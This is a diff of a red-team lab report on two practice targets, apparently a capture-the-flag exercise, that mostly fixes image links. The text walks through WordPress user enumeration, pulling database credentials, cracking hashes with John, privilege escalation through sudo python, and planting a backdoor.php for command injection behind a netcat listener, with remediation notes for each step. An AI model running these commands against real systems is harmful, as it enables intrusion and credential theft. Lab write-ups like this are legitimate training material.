@@ -119,12 +119,12 @@ cpe:/a:apache:http_server:2.4.10:
  1337DAY-ID-1161 0.0     https://vulners.com/zdt/1337DAY-ID-1161 *EXPLOIT*
 
   # nmap --script vuln -sV -p80 192.168.1.110
-   ![nmapVulnTarget1]/images/nmap_vuln_Target1.png
+   ![nmapVulnTarget1](/Images/nmap_vuln_Target1.png)
 
 Target 2 returned identical results to Target 1 
 
   # nmap --script vuln -sV -p80 192.168.1.115
-   ![nmapVulnTarget2]/images/nmap_vuln_Target2.png
+   ![nmapVulnTarget2](/Images/nmap_vuln_Target2.png)
 
 ### Exploitation Process
 
@@ -132,14 +132,14 @@ Target 2 returned identical results to Target 1
 The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve the following confidential data:
 - Target 1
   - flag1 hash value: `b9bbcd33e11b80be759c4e844862482d`
-      ![flag1]/images/flag1-found_Target1.PNG
+      ![flag1](/Images/flag1-found_Target1.png)
     - **Exploit Used**
       - (Common Weakness) CWE-540: Inclusion of Sensitive Information in Source Code 
       - Click SERVICE link > 192.168.1.110/service.html, Right Click, View Source, flag1 is visible in a commented out line below the footer. 
      REMEDIATION: Source code should be reviewed and all comments removed from production versions of code.
 
   - flag2 hash value: `fc3fd58dcdad9ab23faca6e9a36e581c`
-      ![flag2]/images/flag2-found_Target1.PNG
+      ![flag2](/Images/flag2-found_Target1.png)
     - **Exploit Used**
       - (Common Weakness) CWE-521: Weak Password Requirements
       - an easily guessed password for user michael (ssh login),
@@ -152,17 +152,17 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 
 
       Identified wordpress installed through testing links on homepage; BLOG directs to  192.168.1.110/wordpress
-      ![BLOG]/images/BLOG_Target1.PNG
+      ![BLOG](/Images/BLOG_Target1.png)
       This page has a Log in link
-      ![loginURL]/images/Login_URL_Target1.PNG
-      ![wp-login]/images/wp-login_Target1.PNG
-
+      ![loginURL](/Images/Login_URL_Target1.png)
+      ![wp-login](/Images/wp-login_Target1.png)
+      
       Run wpscan to enumerate users: 'wpscan --url http://192.168.1.110/wordpress --enumerate u'
-      ![wpscan1a]/images/WPScan_Target1a.PNG
-      ![wpscan1b]/images/WPScan_Target1b.PNG
+      ![wpscan1a](/Images/WPScan_Target1a.png)
+      ![wpscan1b]/Images/WPScan_Target1b.png)
 
   - flag3 hash value: `afc01ab5650591e7dccf93122770cd2`
-      ![flag3]/images/flag3-detail_Target1.PNG
+      ![flag3](/Images/flag3-detail_Target1.png)
     - **Exploit Used**
       - (Common Weakness) CWE-260: Password in configuration file
       wp-config.php contained DB_NAME, DB_USER, DB_PASSWORD for root user in clear text
@@ -170,45 +170,45 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
     REMEDIATION: The principle of least privilege should be enforced.
       'chmod 600 /var/www/html/wordpress/wp-config.php'
     michael@target1:/user/bin$ 'mysql -u root -p'
-      ![mysql-login]/images/mysql-login_Target1.PNG
+      ![mysql-login](/Images/mysql-login_Target1.png)
     mysql login achieved - what can we find ?
       
     'show databases;'
-    ![databases]/images/mysql-db_Target1.PNG
+    ![databases](/Images/mysql-db_Target1.png)
     'show tables;'
-    ![tables]/images/mysql-tables_Target1.PNG
+    ![tables](/Images/mysql-tables_Target1.png)
     'describe wp_posts;'
-    ![posts]/images/mysql-wp_posts_Target1.PNG
+    ![posts](/Images/mysql-wp_posts_Target1.png)
     I noted that the default value for post_status = 'publish'
     'select * FROM wp_posts WHERE post_status != 'publish''
-    ![user-passwd]/images/mysql-user-login-pass_Target1.PNG
+    ![user-passwd](/Images/mysql-user-login-pass_Target1.png)
     'show tables;'
-    /images/mysql-tables_Target1.PNG
+    ![tables](/images/mysql-tables_Target1.png)
     'describe wp_users;'
-    ![wp-users]/images/mysql-wp_users_Target1.PNG
+    ![wp-users](/Images/mysql-wp_users_Target1.png)
     'select user_login, user_pass from wp_users;'
-    ![user-passwd]/images/mysql-user-login-pass_Target1.PNG
+    ![user-passwd](/Images/mysql-user-login-pass_Target1.png)
 
     Create file wp_hashes.txt
-    ![wp-hashes]/images/wp_hashes_Target1.PNG
+    ![wp-hashes](/Images/wp_hashes_Target1.png)
     Use John The Ripper to unhash the password of user steven
     'john --wordlist=/root/Downloads/rockyou.txt /root/Downloads/wp_hashes.txt'
-    ![john]/images/john-steven_Target1.PNG
+    ![john](/Images/john-steven_Target1.png)
 
     ssh into Target1 as steven: 'ssh steven@192.168.1.110'
-    ![ssh-steven]/images/ssh-steven_Target1.PNG
+    ![ssh-steven](/Images/ssh-steven_Target1.png)
     Verify the sudo permissions of steven: sudo -l'
-    ![sudo-l]/images/sudo-steven_Target1.PNG
+    ![sudo-l](/Images/sudo-steven_Target1.png)
     We see steven has sudo permission for python
     We can exploit this to gain a shell as root: 'python -c 'import pty;pty.spawn("/bin/bash")''
-    ![priv-escln]/images/privilege-escalation_py_Target1.PNG
+    ![priv-escln](/Images/privilege-escalation_py_Target1.png)
     Now as root, search for flag file 
-    ![found4]/images/flag4-found_Target1.PNG
+    ![found4](/Images/flag4-found_Target1.png)
     Display the contents of flag4.txt
-    ![flag4]/images/flag4-detail_Target1.PNG
+    ![flag4](/Images/flag4-detail_Target1.png)
 
       - flag4 hash value: `715dea6c055b9fe3337544932f2941ce`
-      ![found4]/images/flag4-found_Target1.PNG
+      ![found4](/Images/flag4-found_Target1.png)
     - **Exploit Used**
       - (Common Weakness) CWE-250: Execution with Unnecessary Privileges
       User steven has excessive privilege
@@ -219,14 +219,14 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
 
 - Target 2
   - flag1 hash value: `a2c1f66d2b8051db3a5874b5874b5b6e43e21`
-      ![found1-T2]/images/flag1-found_Target2.PNG
+      ![found1-T2](/Images/flag1-found_Target2.png)
     - **Exploit Used**
       - (Common Weakness) CWE-548: Information leakage through directory listing
       - 'gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -u 192.168.1.115'
-    ![gobuster]/images/gobuster_Target2.PNG
+    ![gobuster](/Images/gobuster_Target2.png)
     Browsing the directories discovered I found flag1 at 192.168.1.115/vendor/PATH (/var/www/html/vendor)
-    ![vendor]/images/vendor_Target2.PNG
-    ![found1-T2]/images/flag1-found_target2.PNG
+    ![vendor]/(Images/vendor_Target2.png)
+    ![found1-T2](/Images/flag1-found_target2.png)
     REMEDIATION: we should add line, "Options -Indexes" in .ht access (must be added in each folder) OR
        we can disable directory listing for a specified directory by adding this code in Apache Virtual Host
       <Directory /var/www/public_html>
@@ -234,27 +234,27 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
       </Directory>
 
   - flag2 hash value: `6a8ed560f0b5358ecf844108048eb337`
-      ![found2-T2]/images/flag2-found_Target2.PNG
+      ![found2-T2](/Images/flag2-found_Target2.png)
     - **Exploit Used**
       - (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
       - '192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''
-      ![find.flags]/images/find-flags_Target2.PNG
-      (the path to flag3 is also disclosed here)
+      ![find.flags](/Images/find-flags_Target2.png)
+           (the path to flag3 is also disclosed here)
       - '192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'
     REMEDIATION: Proper input controls within the application would prevent the execution of this exploit. 
      
      Establishing the backdoor;
      The script provided was edited to include the IP of target2
      exploit.sh generates backdoor.php on the target, encoded with functions to allow command injection 
-    ![backdoor.php]/images/edited-exploit_Target2.PNG
+    ![backdoor.php](/Images/edited-exploit_Target2.png)
     Prior to execution, establish a netcat session: 'nc -lvnp 4444' 
      './exploit.sh'
-    ![runExploit]/images/run-exploit_Target2.PNG
+    ![runExploit](/Images/run-exploit_Target2.png)
     We now have a command injection script (backdoor.php) on Target 2 that is accessible via browser.
 **Y'all are running components with known vulnerabilities**
 
   - flag3 hash value: `a0f568aa9de277887f37730d71520d9b`
-     ![flag3-T2]/images/flag3-found_Target2.PNG
+     ![flag3-T2](/Images/flag3-found_Target2.png)
     - **Exploit Used**
       - (Common Weakness) CWE-522: Local file inclusion
       - '192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png'
